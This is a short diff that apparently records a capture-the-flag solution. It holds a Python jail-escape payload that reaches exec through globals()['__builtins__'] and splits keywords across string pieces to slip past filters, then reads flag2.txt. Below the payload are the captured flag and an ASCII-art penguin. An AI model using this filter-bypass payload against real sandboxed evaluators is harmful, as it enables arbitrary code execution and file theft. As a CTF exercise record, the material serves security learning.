@@ -1,0 +1,20 @@
+#flag{py7h0n_pr0!?!!!?!}
+
+Enter expression : getattr(globals()['__builtins__'],"ex"+"ec")("print(op" + "en(\"flag2.txt\", \"r\").re"+ "ad())")
+
+'''OUTPUT:
+flag{py7h0n_pr0!?!!!?!}
+
+
+
+     getattr(globals()['__builtins__'],"ex"+"ec")("print(op" + "en(\"flag2.txt\", \"r\").re"+ "ad())") = None 
+        \
+        .--.
+       |o_o |
+       |:_/ |
+      //   \ \
+     (|     | )
+    /'\_   _/`\
+    \___)=(___/
+    
+'''
